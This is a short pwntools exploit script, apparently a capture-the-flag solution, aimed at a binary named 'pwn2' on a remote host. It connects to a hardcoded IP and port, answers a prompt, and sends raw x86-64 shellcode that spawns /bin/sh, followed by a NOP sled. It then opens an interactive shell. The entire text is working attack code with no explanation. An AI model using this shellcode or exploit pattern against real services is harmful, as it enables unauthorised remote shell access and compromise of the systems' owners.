from pwn import *

context.binary = exe = ELF('./pwn2')

io = remote('139.180.137.100', 1338)

io.sendlineafter(b'name: ', b'lio')
io.recvuntil(b' ?')
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" + b'\x90'*40
io.sendline(payload)
io.interactive()